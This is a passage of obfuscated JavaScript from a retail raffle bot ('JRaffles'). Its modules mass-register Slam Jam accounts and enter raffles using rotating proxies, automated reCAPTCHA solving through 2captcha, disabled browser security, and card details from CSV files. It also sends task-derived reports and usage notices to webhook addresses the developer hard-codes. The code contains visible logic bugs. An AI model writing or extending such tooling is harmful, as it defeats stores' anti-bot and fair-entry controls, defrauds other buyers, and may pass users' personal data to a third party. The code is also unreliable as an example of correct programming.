                            _0x33f3a3 == 'yes' && _0x19352f >= 0x5 && (_0x17fcb0(_0xfbfe6d[_0x3ef08b], _0x4ca020), _0x33f3a3 = 'no', _0x19352f = 0x0), console['log']('Waiting\x20for\x20' + _0x15bf3f['delay'] + '\x20ms'), await _0x37731a(_0x15bf3f['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x27d5b3, _0x141d96, _0x11fdda) {
                    _0x3df2da['use'](_0x6b6409()), _0x3df2da['use'](_0x371b3c({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x15bf3f['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3516a7 = 0x0; _0x3516a7 < _0x141d96['length']; _0x3516a7++) {
                        if (_0x336ac0 != 'yes')
                            var _0x336ac0 = '', _0x2bea36 = 0x0;
                        var _0x49861e = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x6362be
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x15bf3f['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x2bd99c
                                }
                            ]
                        }];
                        const _0x26c73b = { 'embeds': _0x49861e };
                        _0x57fa03(_0x27d5b3['name'] + '\x20Task\x20' + (_0x3516a7 + 0x1) + '\x20/\x20' + _0x141d96['length'] + '\x20||\x20File:\x20' + _0x5b46f0 + '\x20Proxies:\x20' + _0x519e9c);
                        try {
                            await _0x412246(_0x141d96, _0x3516a7);
                        } catch {
                            _0x336ac0 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x188092 = await _0x5c5001(_0x141d96[_0x3516a7], _0x27d5b3, 'acc', ![]);
                        const _0x2d3e1a = { 'succesDEVMSG': { 'embeds': [_0x188092] } };
                        if (_0x141d96[_0x3516a7]['Email'] == '' || _0x141d96[_0x3516a7]['FirstName'] == '' || _0x141d96[_0x3516a7]['LastName'] == '') {
                            console['log'](_0x1c7496() + '\x20[' + _0x306e17[taskModule]['name'] + ']\x20Task\x20' + (_0x3516a7 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x37731a(0x7d0);
                            continue;
                        }
                        (_0x141d96[_0x3516a7]['Password'] == '' || _0x141d96[_0x3516a7] == undefined) && _0x141d96[_0x3516a7]['Password'] == 'JRaffles23!';
                        if (_0x15bf3f['useRandomProxy'] = ![])
                            var _0x17b88a = _0x11fdda[_0x3516a7]['split'](':');
                        else
                            var _0x6863d8 = Math['round'](Math['random']() * (_0x11fdda['length'] - 0x1)), _0x17b88a = _0x11fdda[_0x6863d8]['split'](':');
                        const _0x150082 = await _0x3df2da['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x17b88a[0x0] + ':' + _0x17b88a[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x245277 = await _0x150082['newPage']();
                            await _0x245277['authenticate']({
                                'username': '' + _0x17b88a[0x2],
                                'password': '' + _0x17b88a[0x3]
                            }), console['log'](_0x1c7496() + '\x20[' + _0x27d5b3['name'] + ']\x20Task\x20' + (_0x3516a7 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x245277['setRequestInterception'](!![]), _0x245277['on']('request', _0x30ea4e => {
                                _0x30ea4e['resourceType']() === 'image' || _0x30ea4e['resourceType']() === 'font' || _0x30ea4e['resourceType']() === 'media' ? _0x30ea4e['abort']() : _0x30ea4e['continue']();
                            }), await _0x245277['goto']('https://drop.slamjam.com/account/register'), await _0x37731a(0xbb8), await _0x245277['waitForSelector']('#FirstName'), await _0x245277['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x245277['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x1c7496() + '\x20[' + _0x27d5b3['name'] + ']\x20Task\x20' + (_0x3516a7 + 0x1) + '\x20:\x20Filling\x20information'), await _0x37731a(0x4b0), await _0x245277['type']('#FirstName', '' + _0x141d96[_0x3516a7]['FirstName']), await _0x37731a(0x226), await _0x245277['type']('#LastName', '' + _0x141d96[_0x3516a7]['LastName']), await _0x37731a(0x226), await _0x245277['type']('#Email', '' + _0x141d96[_0x3516a7]['Email']), await _0x37731a(0x2ee), await _0x245277['type']('#ConfirmEmail', '' + _0x141d96[_0x3516a7]['Email']), await _0x37731a(0x2ee), await _0x245277['type']('#CreatePassword', '' + _0x141d96[_0x3516a7]['Password']), await _0x37731a(0x2ee), await _0x245277['type']('#CreateConfirmPassword', '' + _0x141d96[_0x3516a7]['Password']), await _0x37731a(0x226), console['log'](_0x1c7496() + '\x20[' + _0x27d5b3['name'] + ']\x20Task\x20' + (_0x3516a7 + 0x1) + '\x20:\x20Submitting..'), await _0x245277['$eval']('#create_customer', _0x3202e2 => _0x3202e2['submit']()), await _0x37731a(0x1388), console['log'](_0x1c7496() + '\x20[' + _0x27d5b3['name'] + ']\x20Task\x20' + (_0x3516a7 + 0x1) + '\x20:\x20' + _0x7ff36['cyan']('Solving\x20Captcha')), await _0x245277['solveRecaptchas'](), console['log'](_0x1c7496() + '\x20[' + _0x27d5b3['name'] + ']\x20Task\x20' + (_0x3516a7 + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x245277['$eval']('.shopify-challenge__container\x20>\x20form', _0x16a93a => _0x16a93a['submit']());
                            try {
                                await _0x245277['waitForSelector']('.product-card__image'), await _0x37731a(0x1f4), _0x336ac0 = 'no', console['log'](_0x7ff36['green'](_0x1c7496() + '\x20[' + _0x27d5b3['name'] + ']\x20Task\x20' + (_0x3516a7 + 0x1) + '\x20:\x20Account\x20' + _0x141d96[_0x3516a7]['Email'] + '\x20Generated!')), _0x241ca2['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x141d96[_0x3516a7]['Email'] + ',' + _0x141d96[_0x3516a7]['Password']), console['log'](_0x7ff36['yellow'](_0x1c7496() + '\x20[' + _0x27d5b3['name'] + ']\x20Task\x20' + (_0x3516a7 + 0x1) + '\x20:\x20Account\x20' + _0x141d96[_0x3516a7]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x15bf3f['webhook'] != undefined && _0x15bf3f['webhook'] != '' && await _0x4160b0(_0x15bf3f['webhook'], _0x2d3e1a['succesDEVMSG']);
                                } catch {
                                }
                                await _0x4160b0(_0x14c79a, _0x2d3e1a['succesDEVMSG']);
                            } catch (_0x46cc9f) {
                                console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x306e17[taskModule]['name'] + ']\x20Task\x20' + (_0x3516a7 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x46cc9f));
                            }
                        } catch (_0x10b773) {
                            console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x306e17[taskModule]['name'] + ']\x20Task\x20' + (_0x3516a7 + 0x1) + '\x20:\x20' + _0x10b773));
                        } finally {
                            _0x150082 && _0x150082['close']();
                            if (_0x336ac0 == 'yes' && _0x2bea36 != 0x5) {
                                console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x27d5b3['name'] + ']\x20Task\x20' + (_0x3516a7 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2bea36 + '\x20/\x205)')), _0x3516a7 = _0x3516a7 - 0x1, _0x2bea36 = _0x2bea36 + 0x1;
                                continue;
                            }
                            _0x336ac0 == 'yes' && _0x2bea36 >= 0x5 && (_0x17fcb0(_0x141d96[_0x3516a7], _0x27d5b3), _0x336ac0 = 'no', _0x2bea36 = 0x0), console['log']('Waiting\x20for\x20' + _0x15bf3f['delay'] + '\x20ms'), await _0x37731a(_0x15bf3f['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x58b90f, _0x5a8b28, _0x558f31) {
                    _0x3df2da['use'](_0x6b6409()), _0x3df2da['use'](_0x371b3c({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x15bf3f['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x170465 = 0x0; _0x170465 < _0x5a8b28['length']; _0x170465++) {
                        var _0x1e2aca;
                        if (_0x5567ce != 'yes')
                            var _0x5567ce = '', _0x4b7cd0 = 0x0;
                        _0x57fa03(_0x58b90f['name'] + '\x20Task\x20' + (_0x170465 + 0x1) + '\x20/\x20' + _0x5a8b28['length'] + '\x20||\x20File:\x20' + _0x5b46f0 + '\x20Proxies:\x20' + _0x519e9c);
                        try {
                            await _0x412246(_0x5a8b28, _0x170465);
                        } catch {
                            _0x5567ce = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x5a8b28[_0x170465]['Email'] == '' || _0x5a8b28[_0x170465]['Password'] == '' || _0x5a8b28[_0x170465]['FirstName'] == '' || _0x5a8b28[_0x170465]['LastName'] == '') {
                            console['log'](_0x1c7496() + '\x20[' + _0x58b90f['name'] + ']\x20Task\x20' + (_0x170465 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x15bf3f['useRandomProxy'] = ![])
                            var _0xcdd481 = _0x558f31[_0x170465]['split'](':');
                        else
                            var _0x415f47 = Math['round'](Math['random']() * (_0x558f31['length'] - 0x1)), _0xcdd481 = _0x558f31[_0x415f47]['split'](':');
                        const _0x216bef = await _0x3df2da['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0xcdd481[0x0] + ':' + _0xcdd481[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox',
                                '--disable-web-security',
                                '--disable-features=IsolateOrigins',
                                '\x20--disable-site-isolation-trials'
                            ]
                        });
                        try {
                            const _0x14042d = await _0x216bef['newPage']();
                            await _0x14042d['authenticate']({
                                'username': '' + _0xcdd481[0x2],
                                'password': '' + _0xcdd481[0x3]
                            }), await _0x14042d['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x1c7496() + '\x20[' + _0x58b90f['name'] + ']\x20Task\x20' + (_0x170465 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x14042d['setRequestInterception'](!![]), _0x14042d['on']('request', _0x370cb8 => {
                                _0x370cb8['resourceType']() === 'image' || _0x370cb8['resourceType']() === 'font' || _0x370cb8['resourceType']() === 'media' ? _0x370cb8['abort']() : _0x370cb8['continue']();
                            }), await _0x14042d['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x14042d['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x14042d['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x37731a(0x258), await _0x14042d['waitForSelector']('#CustomerEmail'), console['log'](_0x1c7496() + '\x20[' + _0x58b90f['name'] + ']\x20Task\x20' + (_0x170465 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x14042d['type']('#CustomerEmail', '' + _0x5a8b28[_0x170465]['Email']), await _0x37731a(0x12c), await _0x14042d['type']('#CustomerPassword', '' + _0x5a8b28[_0x170465]['Password']), await _0x37731a(0x226), await _0x14042d['$eval']('#customer_login', _0x4859e8 => _0x4859e8['submit']()), await _0x37731a(0x7d0), await _0x14042d['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x1c7496() + '\x20[' + _0x58b90f['name'] + ']\x20Task\x20' + (_0x170465 + 0x1) + '\x20:\x20' + _0x7ff36['cyan']('Solving\x20Captcha')), await _0x14042d['solveRecaptchas'](), console['log'](_0x1c7496() + '\x20[' + _0x58b90f['name'] + ']\x20Task\x20' + (_0x170465 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x14042d['$eval']('.shopify-challenge__container\x20>\x20form', _0x4b35d1 => _0x4b35d1['submit']());
                            try {
                                await _0x14042d['waitForSelector']('.nav-account'), await _0x37731a(0x4b0);
                            } catch {
                                console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x58b90f['name'] + ']\x20Task\x20' + (_0x170465 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x14042d['goto']('' + _0x5a8b28[_0x170465]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x37731a(0xbb8), console['log'](_0x1c7496() + '\x20[' + _0x58b90f['name'] + ']\x20Task\x20' + (_0x170465 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x14042d['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x14042d['click']('.product-select-variant-wrapper'), await _0x37731a(0x320), await _0x14042d['click']('li.product-select-variant__value[data-size=\x22' + _0x5a8b28[_0x170465]['Size'] + '\x22]'), await _0x37731a(0x384), await _0x14042d['$eval']('#AddToCartForm-product-template-raffle', _0x80ad47 => _0x80ad47['submit']()), await _0x14042d['waitForSelector']('.cart-order-summary__content'), await _0x37731a(0x514), await _0x14042d['goto']('https://drop.slamjam.com/checkout'), await _0x37731a(0x514), await _0x14042d['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x1c7496() + '\x20[' + _0x58b90f['name'] + ']\x20Task\x20' + (_0x170465 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x14042d['select']('#checkout_shipping_address_country', '' + _0x5a8b28[_0x170465]['Country']), await _0x37731a(0x200), await _0x14042d['waitForSelector']('#checkout_shipping_address_first_name'), await _0x14042d['type']('#checkout_shipping_address_first_name', '' + _0x5a8b28[_0x170465]['FirstName']), await _0x37731a(0x237), await _0x14042d['type']('#checkout_shipping_address_last_name', '' + _0x5a8b28[_0x170465]['LastName']), await _0x37731a(0x1e0), await _0x14042d['type']('#checkout_shipping_address_address1', _0x5a8b28[_0x170465]['Address1'] + '\x20' + _0x5a8b28[_0x170465]['HouseNumber']), await _0x37731a(0x514), await _0x14042d['type']('#checkout_shipping_address_address2', '' + _0x5a8b28[_0x170465]['Address2']), await _0x37731a(0x514);
                            _0x5a8b28[_0x170465]['Postcode'] == undefined && (_0x5a8b28[_0x170465]['Postcode'] = _0x5a8b28[_0x170465]['Zip']);
                            await _0x14042d['type']('#checkout_shipping_address_zip', '' + _0x5a8b28[_0x170465]['Postcode']), await _0x37731a(0x2bc), await _0x14042d['type']('#checkout_shipping_address_city', '' + _0x5a8b28[_0x170465]['City']), await _0x37731a(0x320), await _0x14042d['type']('#checkout_shipping_address_phone', '' + _0x5a8b28[_0x170465]['Phone']), await _0x37731a(0x320), await _0x14042d['click']('#continue_button'), await _0x37731a(0xbb8), await _0x14042d['waitForSelector']('.summary-title'), await _0x37731a(0x320), await _0x14042d['click']('#continue_button'), await _0x37731a(0x320), console['log'](_0x1c7496() + '\x20[' + _0x58b90f['name'] + ']\x20Task\x20' + (_0x170465 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x14042d['waitForSelector']('#checkout_credit_card_vault'), await _0x37731a(0x3e8);
                            var _0x1ec6c6 = await _0x14042d['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x2dab90 = await _0x1ec6c6['contentFrame']();
                            await _0x2dab90['click']('#number'), await _0x37731a(0x3e8), await _0x2dab90['type']('#number', '' + _0x5a8b28[_0x170465]['CardNumber'], { 'delay': 0x78 }), _0x1ec6c6 = await _0x14042d['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x2dab90 = await _0x1ec6c6['contentFrame'](), await _0x37731a(0x1c2), await _0x2dab90['click']('#name'), await _0x37731a(0x1f4), await _0x2dab90['type']('#name', '' + _0x5a8b28[_0x170465]['NameOnCard'], { 'delay': 0x78 }), _0x1ec6c6 = await _0x14042d['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x2dab90 = await _0x1ec6c6['contentFrame'](), await _0x37731a(0x1c2), await _0x2dab90['click']('#expiry'), await _0x37731a(0x1f4), await _0x2dab90['type']('#expiry', '' + _0x5a8b28[_0x170465]['ExpiryDate'], { 'delay': 0x78 }), _0x1ec6c6 = await _0x14042d['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x2dab90 = await _0x1ec6c6['contentFrame'](), await _0x37731a(0x1c2), await _0x2dab90['click']('#verification_value'), await _0x37731a(0x1f4), await _0x2dab90['type']('#verification_value', '' + _0x5a8b28[_0x170465]['CVV'], { 'delay': 0x78 }), await _0x14042d['$eval']('#accepts-flag-raffle', _0x59a993 => _0x59a993['click']()), await _0x37731a(0x7d0), console['log'](_0x1c7496() + '\x20[' + _0x58b90f['name'] + ']\x20Task\x20' + (_0x170465 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x14042d['$eval']('#continue_button', _0x51573b => _0x51573b['click']()), await _0x37731a(0x1b58), await _0x14042d['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x14042d['$eval']('.edit_checkout.animate-floating-labels', _0x5e7e58 => _0x5e7e58['submit']()), await _0x37731a(0x7d0);
                            try {
                                await _0x14042d['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x5567ce = 'no', _0x5879e0(_0x5a8b28[_0x170465], _0x58b90f), console['log'](_0x7ff36['green'](_0x1c7496() + '\x20[' + _0x58b90f['name'] + ']\x20Task\x20' + (_0x170465 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x1afaf8) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x1afaf8['message']);
                            }
                            var _0x4f41f1 = await _0x5c5001(_0x5a8b28[_0x170465], _0x58b90f, 'dev', ![]), _0xc20eb = await _0x5c5001(_0x5a8b28[_0x170465], _0x58b90f, 'pub', ![]);
                            const _0x14a0bd = {
                                'succesDEVMSG': { 'embeds': [_0x4f41f1] },
                                'succesPUBMSG': { 'embeds': [_0xc20eb] }
                            };
                            try {
                                _0x15bf3f['webhook'] != undefined && _0x15bf3f['webhook'] != '' && await _0x4160b0(_0x15bf3f['webhook'], _0x14a0bd['succesDEVMSG']), await _0x37731a(0xc8), await _0x4160b0(_0x4ebf40, _0x14a0bd['succesDEVMSG']), await _0x37731a(0xc8), await _0x4160b0(_0xd6338c, _0x14a0bd['succesPUBMSG']);
                            } catch (_0x503970) {
                                console['log'](_0x7ff36['yellow'](_0x1c7496() + '\x20[' + _0x306e17[taskModule]['name'] + ']\x20Task\x20' + (_0x170465 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x503970));
                            }
                        } catch (_0x1d6923) {
                            console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x306e17[taskModule]['name'] + ']\x20Task\x20' + (_0x170465 + 0x1) + '\x20:\x20' + _0x1d6923)), _0x1e2aca = '' + _0x1d6923;
                            var _0x9118ea = await _0x5c5001(kickz[_0x170465], _0x58b90f, 'dev', !![], _0x1e2aca);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x9118ea] }, _0x15bf3f['webhook'] != undefined && _0x15bf3f['webhook'] != '' && await _0x4160b0(_0x15bf3f['webhook'], EMBEDS['errorDEV']), await _0x4160b0(_0x3ce78e, EMBEDS['errorDEV']), _0x5567ce = 'yes';
                        } finally {
                            _0x216bef && _0x216bef['close']();
                            if (_0x5567ce == 'yes' && _0x4b7cd0 != 0x5 && _0x1e2aca != 'Size\x20Not\x20Found') {
                                console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x58b90f['name'] + ']\x20Task\x20' + (_0x170465 + 0x1) + '\x20:\x20Retrying\x20(' + _0x4b7cd0 + '\x20/\x205)')), _0x170465 = _0x170465 - 0x1, _0x4b7cd0 = _0x4b7cd0 + 0x1;
                                continue;
                            }
                            _0x5567ce == 'yes' && _0x4b7cd0 >= 0x5 && (_0x17fcb0(_0x5a8b28[_0x170465], _0x58b90f), _0x5567ce = 'no', _0x4b7cd0 = 0x0), console['log']('Waiting\x20for\x20' + _0x15bf3f['delay'] + '\x20ms'), await _0x37731a(_0x15bf3f['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x48fa17) {
                    var _0x398e25 = await _0x24911e(), _0x3db64c = _0x241ca2['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x4c2ceb = _0x34efb8['parse'](_0x3db64c, { 'header': !![] })['data'];
                    for (var _0x251531 = 0x0; _0x251531 < _0x4c2ceb['length']; _0x251531++) {
                        var _0x11219f = _0x4c2ceb[_0x251531]['Store'], _0x2dc576 = _0x4c2ceb[_0x251531]['Mode'];
                        for (var _0x2eabec of _0x306e17) {
                            const _0x128d66 = _0x2eabec['name']['includes'](_0x11219f);
                            if (!_0x128d66)
                                continue;
                            for (mode of _0x2eabec['modules']) {
                                if (mode['name'] == _0x2dc576) {
                                    console['log']('Running\x20' + _0x7ff36['cyan'](mode['name'])), await mode['function'](mode, [_0x4c2ceb[_0x251531]], _0x398e25);
                                    var _0x2b18eb = _0x3db64c['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x241ca2['writeFileSync']('../failed-tasks.csv', _0x2b18eb);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x2db9a1 = await _0x8ec788['get']('Answer');
                    if (_0x2db9a1['Answer']['toLowerCase']() == 'y') {
                        _0x241ca2['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x37731a(0x3e8);
                        return;
                    }
                    if (_0x2db9a1['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x37731a(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x37731a(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x1c4913(_0x17f477) {
    var _0x41253a = await _0x24911e(), _0x26811a = _0x241ca2['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x105fa9 = _0x34efb8['parse'](_0x26811a, { 'header': !![] })['data'];
    for (var _0x4940df = 0x0; _0x4940df < _0x105fa9['length']; _0x4940df++) {
        var _0x41d0db = _0x105fa9[_0x4940df]['Store'], _0x309f1d = _0x105fa9[_0x4940df]['Mode'];
        for (var _0x16d308 of _0x306e17) {
            const _0x37c6e2 = _0x16d308['name']['includes'](_0x41d0db);
            if (_0x37c6e2)
                for (mode of _0x306e17[_0x16d308]['modules']) {
                    const _0x2678bd = mode['name']['includes'](_0x309f1d);
                    _0x2678bd && (_0x17f477 = mode['name'], await mode['function'](_0x17f477, _0x105fa9[_0x4940df], _0x41253a));
                }
        }
    }
}
async function _0x2dbe27() {
    await _0x2ce21f(), console['clear']();
    if (_0x2bd99c != 'devkey') {
        let _0x33b3e1 = await _0x2632e6['autoUpdate']();
        if (_0x33b3e1 === 'yes')
            return _0x28901b('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x2cc9cc == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x37731a(0x2710);
        ;
    }
    await _0x1c7a60(_0x2cc9cc);
    if (_0x4311df === ![])
        return console['log']('Closing\x20Browser'), await _0x37731a(0xbb8);
    else
        try {
            var _0x3153d2 = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x6362be
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x2bd99c
                    }
                ]
            }];
            const _0x3dc4db = { 'embeds': _0x3153d2 };
            var _0x3c7f7d = await _0x5c5001(null, null, 'open', ![]);
            const _0x255b75 = { 'openDEVMSG': { 'embeds': [_0x3c7f7d] } };
            await _0x4160b0(_0x2d1e92, _0x255b75['openDEVMSG']);
            async function _0x479139() {
                _0x57fa03('JRaffles\x20' + _0x2bd99c), console['clear'](), console['log']('Welcome\x20to\x20' + _0x7ff36['cyan']('JRaffles();') + '\x20' + _0x2bd99c), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x48f1d0 = 0x0; _0x48f1d0 < _0x306e17['length'] - 0x4; _0x48f1d0++) {
                    if (_0x48f1d0 >= 0xa) {
                        console['log']('\x20(' + _0x48f1d0 + ')\x20[' + _0x306e17[_0x48f1d0]['name'] + ']');
                        continue;
                    }
                    if (_0x306e17[_0x48f1d0]['name'] === 'Reload\x20Settings' || _0x306e17[_0x48f1d0]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x48f1d0 + ')\x20\x20[' + _0x306e17[_0x48f1d0]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x306e17['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x306e17['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x306e17['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x306e17['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x32e666();
                if (taskModule > _0x306e17['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x37731a(0x3e8), _0x479139();
                if (_0x306e17[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x17591d(_0x306e17[taskModule]['modules']);
                    var _0xdc20f3 = _0x306e17[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x2) {
                        var _0x6c9826 = await _0x24911e(), _0x57b29b = await _0x6dcdec();
                        _0x15bf3f['shuffleTasks'] && await _0x123107(_0x57b29b), await _0xdc20f3['function'](_0xdc20f3, _0x57b29b, _0x6c9826);
                    } else {
                        if (taskFunction == 0x0) {
                            var _0x6c9826 = await _0x24911e(), _0x57b29b = await _0x6dcdec();
                            _0x15bf3f['shuffleTasks'] && await _0x123107(_0x57b29b), await _0xdc20f3['function'](_0xdc20f3, _0x57b29b, _0x6c9826);
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x6c9826 = await _0x24911e();
                                await _0xdc20f3['function'](_0xdc20f3, _0x6c9826);
                            }
                        }
                    }
                    return _0x479139();
                }
                if (_0x306e17[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x17591d(_0x306e17[taskModule]['modules']);
                        var _0xdc20f3 = _0x306e17[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x6c9826 = await _0x24911e(), _0x30be45 = await _0x6dcdec();
                            _0x15bf3f['shuffleTasks'] && await _0x123107(_0x30be45), await _0xdc20f3['function'](_0xdc20f3, _0x30be45, _0x6c9826);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x6c9826 = await _0x24911e(), _0x30be45 = await _0x6dcdec();
                                _0x15bf3f['shuffleTasks'] && await _0x123107(_0x30be45), await _0xdc20f3['function'](_0xdc20f3, _0x30be45, _0x6c9826);
                            }
                        }
                    } catch (_0x20dc13) {
                        console['log'](_0x20dc13), await _0x37731a(0xfa0);
                    }
                    return _0x479139();
                }
                if (_0x306e17[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x17591d(_0x306e17[taskModule]['modules']);
                    var _0xdc20f3 = _0x306e17[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x6c9826 = await _0x24911e();
                        return await _0xdc20f3['function'](_0xdc20f3, _0x6c9826), _0x479139();
                    }
                    var _0x6c9826 = await _0x24911e(), _0x10cc68 = await _0x6dcdec();
                    return _0x15bf3f['shuffleTasks'] && await _0x123107(_0x10cc68), await _0xdc20f3['function'](_0xdc20f3, _0x10cc68, _0x6c9826), _0x479139();
                }
                if (_0x306e17[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x17591d(_0x306e17[taskModule]['modules']);
                    var _0xdc20f3 = _0x306e17[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x6c9826 = await _0x24911e(), _0x10cc68 = await _0x6dcdec();
                    return _0x15bf3f['shuffleTasks'] && await _0x123107(_0x10cc68), await _0xdc20f3['function'](_0xdc20f3, _0x10cc68, _0x6c9826), _0x479139();
                }
                if (_0x306e17[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x17591d(_0x306e17[taskModule]['modules']);
